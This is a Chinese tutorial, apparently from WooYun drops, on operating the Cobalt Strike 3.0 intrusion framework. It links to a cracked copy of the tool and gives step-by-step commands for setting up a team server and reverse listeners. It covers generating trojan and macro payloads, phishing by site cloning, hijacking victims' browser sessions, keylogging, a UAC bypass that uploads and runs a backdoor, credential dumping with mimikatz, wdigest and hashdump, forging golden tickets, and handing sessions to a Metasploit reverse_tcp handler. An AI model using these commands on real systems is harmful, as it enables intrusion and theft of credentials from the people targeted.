# Cobalt strike3.0使用手册

![Alt text](http://drops.javaweb.org/uploads/images/945e410e840c1fa6c2bd138d506e9eb3480a53e3.jpg)

0x00 简介
=======

* * *

Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。而Cobalt Strike 3.0已经不再使用Metasploit框架而作为一个独立的平台使用，当然可以结合Armitage进行使用。这里有一个破解版：

> 下载地址：[戳我](http://pan.baidu.com/s/1o60pRZ0#dirpath=%252FCobalt%2520Strike&path=%252FCobalt%2520Strike)(自行验证其安全性)

Cobalt Strike 3.0 延用了其强大的团体服务器功能，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。当然，在使用Cobalt Strike之前，需要安装java环境，具体怎么配置，请移步[java language="环境搭建"][/java][/java](http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=%08linux%20java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&oq=%08java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&rsv_pq=d1bd57b90001a27c&rsv_t=ee9cHC%2FDnpSD3ZsEvIrJ0xE9y6X2rbbbDJqFcWQV3qQzLlo6zooQxKOxCiI&rsv_enter=1&inputT=2121&rsv_sug3=60&rsv_sug1=12&rsv_sug2=0&rsv_sug4=2484)[3](http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=%08linux%20java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&oq=%08java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&rsv_pq=d1bd57b90001a27c&rsv_t=ee9cHC%2FDnpSD3ZsEvIrJ0xE9y6X2rbbbDJqFcWQV3qQzLlo6zooQxKOxCiI&rsv_enter=1&inputT=2121&rsv_sug3=60&rsv_sug1=12&rsv_sug2=0&rsv_sug4=2484)。

0x01 运行
=======

* * *

与之前版本的 Cobalt Strike不同， Cobalt Strike3.0需要开启团体服务器才可以链接使用，当然，这个服务器可以放到公网环境下，或者放到自己想要搭建此服务的环境中。 下载好Cobalt Strike以后包含以下几个文件：

![Alt text](http://drops.javaweb.org/uploads/images/ace71bc0f0a835743d227bcd61bde81b5fcaa230.jpg)

其中关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：

```
☁  cobaltstrike  sudo ./teamserver 192.168.74.1 msf3

```

![Alt text](http://drops.javaweb.org/uploads/images/070d027f18cbf1786b757f730d6748aafc6979f8.jpg)

> 这里为了方便使用，最好使用具体的ip地址，而不是0.0.0.0或者127.0.0.1, 如果有多个网卡，使用你要用的那个ip地址即可，`msf3`为该团体服务器的连接密码。

服务运行以后，在客户端进行连接：

```
☁  cobaltstrike  java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $*

```

![Alt text](http://drops.javaweb.org/uploads/images/084176b1d74d70fff90c6f35e1874fabfceb9645.jpg)

这里ip使用服务器的ip，端口默认50050，用户名随意，密码为之前设置的密码，然后connect,弹出验证窗口，然后点是，就进入Cobalt Strike了。

![Alt text](http://drops.javaweb.org/uploads/images/ae52f3583c83bf2b3017fc035d323718cc7d098c.jpg)

0x02 Listeners
==============

* * *

使用Cobalt Strike首先需要创建一个Listener,依次点击 Cobalt Strike->Listeners ，然后点击Add便可以创建自己想要的Listeners了，Cobalt Strike3.0包括

*   windows/beacon_dns/reverse_dns_txt
*   windows/beacon_dns/reverse_http
*   windows/beacon_http/reverse_http
*   windows/beacon_https/reverse_https
*   windows/beacon_smb/bind_pipe
*   windows/foreign/reverse_dns_txt
*   windows/foreign/reverse_http
*   windows/foreign/reverse_https
*   windows/foreign/reverse_tcp

其中`windows/beacon*`是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，`windows/foreign*`为外部监听器，即msf或者Armitage的监听器。 选择监听器以后，host会自动填写我们开启服务时的ip，配置监听端口，然后保存，监听器就创建好了。

0x03 Attacks
============

* * *

创建好监听器，下面就需要配置客户端了，Cobalt Strike包括多种攻击方式，其中Packages包括如下几种：

![Alt text](http://drops.javaweb.org/uploads/images/a0b2a4fd4a6bc6da51da85597c22574ec5df30b4.jpg)

> `HTML Application`生成恶意的HTA木马文件；
> 
> `MS Office Macro`生成office宏病毒文件；
> 
> `Payload Generator`生成各种语言版本的payload;
> 
> `USB/CD AutoPlay`生成利用自动播放运行的木马文件；
> 
> `Windows Dropper`捆绑器，能够对文档类进行捆绑；
> 
> `Windows Executable`生成可执行exe木马；
> 
> `Windows Executable(S)`生成无状态的可执行exe木马。

Web Drive-by（钓鱼攻击）包括如下几个模块：

![Alt text](http://drops.javaweb.org/uploads/images/876667c2739dd35786b5ce4e764fe0f24e8be535.jpg)

> `Manage`对开启的web服务进行管理；
> 
> `Clone Site`克隆网站，可以记录受害者提交的数据；
> 
> `Host File`提供一个文件下载，可以修改Mime信息；
> 
> `PowerShell Web Delivery`类似于msf 的web_delivery ;
> 
> `Signed Applet Attack`使用java自签名的程序进行钓鱼攻击;
> 
> `Smart Applet Attack`自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；
> 
> `System Profiler`用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。

Spear Phish 是用来邮件钓鱼的模块。

0x04 View
=========

* * *

![Alt text](http://drops.javaweb.org/uploads/images/7a92ccf97742391272040dec6f223a8f28efb8e8.jpg)

View模块可以方便测试者查看各个模块，图形化的界面可以方便的看到受害者机器的各个信息。

> `Applications`显示受害者机器的应用信息；
> 
> `Credentials`显示受害者机器的凭证信息，能更方便的进行后续渗透；
> 
> `Downloads`文件下载；
> 
> `Event Log`可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;
> 
> `Keystrokes`查看键盘记录；
> 
> `Proxy Pivots`查看代理信息；
> 
> `Screenshots`查看屏幕截图；
> 
> `Script Console`在这里可以加载各种脚本以增强功能，脚本地址[戳我](https://github.com/rsmudge/cortana-scripts);
> 
> `Targets`查看目标；
> 
> `Web Log`查看web日志。

还有Reporting的功能就不介绍了，主要就是出报告用的。

0x05 Beacon
===========

* * *

Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。

通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用beacon了，右击电脑，Interact，则可打开Beacon Console;

![Alt text](http://drops.javaweb.org/uploads/images/1cb7ce7a816e5ec7eff1f44f50e1071f33b5ca3f.jpg)

在beacon处输入help，则可以看到详细说明：

```
beacon> help    

Beacon Commands
===============    

    Command                   Description
    -------                   -----------
    browserpivot              Setup a browser pivot session 
    bypassuac                 Spawn a session in a high integrity process
    cancel                    Cancel a download that's in-progress
    cd                        Change directory
    checkin                   Call home and post data
    clear                     Clear beacon queue
    covertvpn                 Deploy Covert VPN client
    desktop                   View and interact with target's desktop
    dllinject                 Inject a Reflective DLL into a process
    download                  Download a file
    downloads                 Lists file downloads in progress
    drives                    List drives on target
    elevate                   Try to elevate privileges
    execute                   Execute a program on target
    exit                      Terminate the beacon session
    getsystem                 Attempt to get SYSTEM
    getuid                    Get User ID
    hashdump                  Dump password hashes
    help                      Help menu
    inject                    Spawn a session in a specific process
    jobkill                   Kill a long-running post-exploitation task
    jobs                      List long-running post-exploitation tasks
    kerberos_ccache_use       Apply kerberos ticket from cache to this session
    kerberos_ticket_purge     Purge kerberos tickets from this session
    kerberos_ticket_use       Apply kerberos ticket to this session
    keylogger                 Inject a keystroke logger into a process
    kill                      Kill a process
    link                      Connect to a Beacon peer over SMB
    logonpasswords            Dump credentials and hashes with mimikatz
    ls                        List files
    make_token                Create a token to pass credentials
    mimikatz                  Runs a mimikatz command
    mkdir                     Make a directory
    mode dns                  Use DNS A as data channel (DNS beacon only)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
    mode http                 Use HTTP as data channel
    mode smb                  Use SMB peer-to-peer communication
    net                       Network and host enumeration tool
    note                      Assign a note to this Beacon       
    portscan                  Scan a network for open services
    powershell                Execute a command via powershell
    powershell-import         Import a powershell script
    ps                        Show process list
    psexec                    Use a service to spawn a session on a host
    psexec_psh                Use PowerShell to spawn a session on a host
    pth                       Pass-the-hash using Mimikatz
    pwd                       Print current directory
    rev2self                  Revert to original token
    rm                        Remove a file or folder
    rportfwd                  Setup a reverse port forward
    runas                     Execute a program as another user
    screenshot                Take a screenshot
    shell                     Execute a command via cmd.exe
    sleep                     Set beacon sleep time
    socks                     Start SOCKS4a server to relay traffic
    socks stop                Stop SOCKS4a server
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes into
    steal_token               Steal access token from a process
    timestomp                 Apply timestamps from one file to another
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file
    wdigest                   Dump plaintext credentials with mimikatz
    winrm                     Use WinRM to spawn a session on a host
    wmi                       Use WMI to spawn a session on a host

```

对于某个模块的使用方式可以直接使用help查看，如：

```
beacon> help browserpivot
Use: browserpivot [pid] [x86|x64]
     browserpivot [stop]    

Setup a Browser Pivot into the specified process. To hijack authenticated
web sessions, make sure the process is an Internet Explorer tab. These
processes have iexplore.exe as their parent process.    

Use "browserpivot stop" to tear down the browser pivoting sessions 
associated with this Beacon.

```

下面主要介绍几个好玩儿的功能。这里为了能快速显示结果，可以设置

```
beacon>sleep 0

```

0x051 Browserpivot
------------------

用户注入受害者浏览器进程，然后开启HTTP代理，之后就可以登录受害者登录的网站了。

使用方式，ps找到浏览器进程：

![Alt text](http://drops.javaweb.org/uploads/images/2fd63aca9c6780f61f5f435e459ec611111456cb.jpg)

注入进程：

```
beacon> browserpivot 3452 x64

```

![Alt text](http://drops.javaweb.org/uploads/images/121c5e64940d12713d3aadc2c0eac8249861b404.jpg)

设置本地浏览器代理：

![Alt text](http://drops.javaweb.org/uploads/images/46939f45bff9a89f621fe3d4cf1b683bacdccdb7.jpg)

当受害者登录某网站账号以后，通过代理，本机浏览器同样登录该网站:

![Alt text](http://drops.javaweb.org/uploads/images/d974da644a75dc98b5ea787e7e3f1f5b5360237a.jpg)

当然当被攻击者关闭浏览器的时候，代理也就失效了，关闭此代理可使用如下命令：

```
browserpivot stop

```

0x052 Socks
-----------

可以直接开启socks4a代理，可以通过代理进行内网渗透测试。

开启socks

```
beacon>socks 9999

```

> 这里可以选择其中一台，右键Pivoting->SOCKS Server，则使用此台计算机开启socks代理。

配置proxychains.conf，添加

```
socks4 127.0.0.1 9999

```

然后就可以通过proxychains 使用各种工具做内网渗透了。

或者直接开启隧道使用msf，依次点击View->Proxy Pivots，选择Socks4a Proxy,点击Tunnel:

![Alt text](http://drops.javaweb.org/uploads/images/88e74afb46dc9ccf94b21fe585cb30f11aea7e05.jpg)

复制以后，在msf中执行，则可以开启代理：

![Alt text](http://drops.javaweb.org/uploads/images/468c46c1d9a0578dd908b31eabed7a6b15c4e8b4.jpg)

关闭socks

```
beacon>socks stop

```

0x053 Screenshot&Keylogger
--------------------------

这里的screenshot可以截取受害者一定时间的屏幕截图，操作命令为：

```
beacon>screenshot [pid] <x86|x64> [run time in seconds]

```

或者

```
beacon>screenshot

```

然后打开View->Screenshots，则可以看到屏幕截图：

![Alt text](http://drops.javaweb.org/uploads/images/d8b1731f6263a7043140ba6b4a61107039240a5d.jpg)

键盘记录器的使用方式为：

```
Use: keylogger [pid] <x86|x64>

```

然后打开View->Keystrokes，则可以看到键盘记录结果：

![Alt text](http://drops.javaweb.org/uploads/images/2bb455e23603aab26de0028f6c4d11b213030b76.jpg)

如果不想使用命令行，可以直接选择受害者计算机（可多选），右键->Explore->Process List：

![Alt text](http://drops.javaweb.org/uploads/images/b362c3caec5ef2c405dc5685af9547f8c7781440.jpg)

0x054 powershell-import
-----------------------

这个功能在后渗透测试中很有用，可以导入各种powershell渗透框架，比如nishang的powerpreter，直接执行：

```
beacon> powershell-import

```

然后在文件浏览器里面选择 Powerpreter.psm1：

![Alt text](http://drops.javaweb.org/uploads/images/f8c9dd8a705099ff4afe86b66065bd66a730b840.jpg)

或者直接执行：

```
powershell-import [/path/to/local/script.ps1]

```

进行导入，之后就可以使用powerpreter的各种模块了。

要执行某模块直接使用如下命令,比如：

```
beacon> powershell Check-VM

```

![Alt text](http://drops.javaweb.org/uploads/images/b69fc952598903c1992720d454eaee3335cfc0b8.jpg)

关于powerpreter之前在zone有简单的介绍，[`powershell`后渗透框架 powerpreter](http://zone.wooyun.org/content/23311)。

0x055 kerberos相关
----------------

这里一共有三个模块，分别是：

*   kerberos_ccache_use :从ccache文件中导入票据
*   kerberos_ticket_purge :清除当前会话的票据
*   kerberos_ticket_use：从ticket文件中导入票据

获取黄金票据的方式比如使用mimikatz:

```
kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FILE

```

乌云关于kerberos也有相关文章，有兴趣的可以看一下：

*   [内网渗透中的mimikatz](http://drops.wooyun.org/tips/7547)
*   [域渗透的金之钥匙](http://drops.wooyun.org/tips/9591)

据说这个在域渗透中很有用哟~

0x056 BypassUAC
---------------

什么，你不能读密码？试试bypassuac吧~

直接执行

```
beacon> bypassuac

```

下面你就可以执行那些需要最高权限的操作了。

这一块在测试Win10的时候并没有成功，关于Win10的bypassuac我在博客里面也有相关介绍，详情:[戳我呀](http://evi1cg.me/archives/Powershell_Bypass_UAC.html)

在这里就演示使用bypassuac的powershell脚本来获取Win10最高权限，由于nishang的powershell脚本现在并不支持Win10,所以这里使用了一个我修改的powershell脚本[invoke-BypassUAC.ps1](https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/invoke-BypassUAC.ps1)

生成一个beacon后门：

![Alt text](http://drops.javaweb.org/uploads/images/ce4e4a5dbb2ae27a31523f5f3caf0a19c7936a76.jpg)

上传后门：

```
beacon> cd E:
beacon> upload /Users/evi1cg/Desktop/test.exe 

```

加载powershell执行后门：

```
beacon> powershell-import /Users/evi1cg/Pentest/Powershell/MyShell/invoke-BypassUAC.ps1
beacon> powershell Invoke-BypassUAC -Command 'E:\test.exe'

```

然后他就破了：

![Alt text](http://drops.javaweb.org/uploads/images/ee569b9acbda20597631b66d1d444ff93ee3e858.jpg)

使用那个破了的电脑的beacon读取密码：

```
beacon> sleep 0
beacon> wdigest

```

![Alt text](http://drops.javaweb.org/uploads/images/81a850cbf77cfc0bd45ff2f97c740357e1403270.jpg)

```
beacon> hashdump

```

![Alt text](http://drops.javaweb.org/uploads/images/d303b963bc18993164cfa0cc92631c9791bfb54d.jpg)

0x06 与msf联动
===========

* * *

cobalt strike3.0 不再使用Metasploit框架而作为一个独立的平台使用，那么怎么通过cobalt strike获取到meterpreter呢，别担心，可以做到的。 首先我们使用msf的reverse_tcp开启监听模式：

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.74.1 
lhost => 192.168.74.1
msf exploit(handler) > set lport 5555
lport => 5555
msf exploit(handler) > exploit -j

```

之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp Listener：

![Alt text](http://drops.javaweb.org/uploads/images/79d8a225afef4733753ddcee002e360fc196db78.jpg)

其中ip为msf的ip地址，端口为msf所监听的端口。  
然后选中计算机，右键->Spawn:

![Alt text](http://drops.javaweb.org/uploads/images/ebe489b2b7bc583befdb19fdd82e2ed33127cec8.jpg)

选择刚刚创建的监听器：

![Alt text](http://drops.javaweb.org/uploads/images/9c2510cd0a2e446884b17cf8967224f1da9b1271.jpg)

可以看到成功获取了meterpreter回话：

![Alt text](http://drops.javaweb.org/uploads/images/90637e9541ccf6008a780473bba4fbe9ef6ecc76.jpg)

0x07 小结
=======

* * *

此次测试使用`windows/beacon_http/reverse_http`来进行，具体DNS的监听器请参考luom所写[Cobalt Strike 之团队服务器的搭建与DNS通讯演示](http://drops.wooyun.org/tools/1475)，本篇文章只是介绍了Cobalt Strike的部分功能，如有错误，请各位大牛指正，关于Cobalt Strike其他的功能小伙伴们可以自己研究，如果可能的话，我也会对其进行补充。希望对各位小伙伴有用。

本文由evi1cg原创并首发于乌云drops，转载请注明